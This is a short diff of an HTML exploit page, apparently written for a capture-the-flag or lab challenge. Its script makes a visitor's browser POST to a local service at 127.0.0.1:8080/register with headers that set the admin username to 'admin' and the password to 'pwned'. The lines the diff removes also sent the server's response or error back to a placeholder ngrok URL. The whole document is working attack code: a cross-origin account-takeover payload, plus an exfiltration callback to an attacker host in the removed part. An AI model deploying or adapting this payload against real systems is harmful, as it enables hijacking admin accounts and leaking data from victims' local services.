@@ -1,21 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Sending exploit and waiting for report...</h1>
   <script>
-    // First, try to reset the password.
     fetch('http://127.0.0.1:8080/register', {
         method: 'POST',
-        headers: { 'X-Username': 'admin', 'X-Password': 'pwned' }
-    })
-    .then(response => response.text()) // Get the response from the server as text
-    .then(responseText => {
-        // Now, send that response text back to our ngrok server for us to see.
-        fetch('https://<YOUR_NGROK_URL>/report_success?data=' + encodeURIComponent(responseText));
-    })
-    .catch(error => {
-        // If there was an error, send the error message back to our server.
-        fetch('https://<YOUR_NGROK_URL>/report_error?data=' + encodeURIComponent(error.toString()));
+        headers: {
+            'X-Username': 'admin',
+            'X-Password': 'pwned'
+        }
     });
   </script>
 </body>
